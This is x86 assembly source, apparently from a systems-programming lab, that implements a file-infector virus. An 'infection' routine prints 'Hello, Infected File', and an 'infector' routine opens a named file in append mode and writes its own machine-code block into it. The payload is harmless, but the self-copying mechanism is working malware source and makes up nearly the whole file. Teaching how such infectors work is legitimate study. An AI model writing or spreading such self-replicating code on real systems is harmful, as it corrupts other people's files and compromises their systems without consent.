section .data
    ; The infection payload message
    inf_msg db 'Hello, Infected File', 10
    inf_len equ $ - inf_msg

section .text
    global _start
    global system_call
    global infection         ; Callable from main.c
    global infector          ; Callable from main.c
    extern main              ; The C directory traversal function

; ------------------------------------------------------------------------------
; LAB PROVIDED GLUE CODE
; ------------------------------------------------------------------------------
_start:
    pop     dword ecx
    mov     esi, esp
    push    esi
    push    ecx
    call    main             ; Calls main() in main.c
    
    mov     ebx, eax
    mov     eax, 1
    int     0x80
    nop

system_call:
    push    ebp
    mov     ebp, esp
    sub     esp, 4
    pushad
    mov     eax, [ebp+8]
    mov     ebx, [ebp+12]
    mov     ecx, [ebp+16]
    mov     edx, [ebp+20]
    int     0x80
    mov     [ebp-4], eax
    popad
    mov     eax, [ebp-4]
    add     esp, 4
    pop     ebp
    ret

; ==============================================================================
; TASK 2: FILE INFECTOR PAYLOAD
; ==============================================================================
code_start:

; ------------------------------------------------------------------------------
; infection: Prints the payload message to the screen.
; ------------------------------------------------------------------------------
infection:
    push    ebp
    mov     ebp, esp
    pushad                   ; Preserve registers for stealth

    mov     eax, 4           ; sys_write
    mov     ebx, 1           ; stdout
    mov     ecx, inf_msg     ; Pointer to 'Hello, Infected File'
    mov     edx, inf_len     ; Length
    int     0x80

    popad                    ; Restore registers
    pop     ebp
    ret

; ------------------------------------------------------------------------------
; infector(char *file_name): Opens a target file and appends the virus code.
; ------------------------------------------------------------------------------
infector:
    push    ebp
    mov     ebp, esp
    pushad

    ; 1. Open target file for appending
    mov     eax, 5           ; sys_open
    mov     ebx, [ebp+8]     ; file_name pointer from stack
    mov     ecx, 1025        ; O_WRONLY (1) | O_APPEND (1024)
    mov     edx, 0644o       ; File permissions
    int     0x80

    cmp     eax, 0
    jl      .end_infector    ; Abort if file failed to open

    mov     ebx, eax         ; Save File Descriptor into ebx

    ; 2. Write virus machine code to the file
    mov     eax, 4           ; sys_write
    mov     ecx, code_start  ; Point to the start of this block
    mov     edx, code_end - code_start ; Calculate size of the virus dynamically
    int     0x80

    ; 3. Close the file
    mov     eax, 6           ; sys_close
    int     0x80

.end_infector:
    popad
    pop     ebp
    ret

code_end: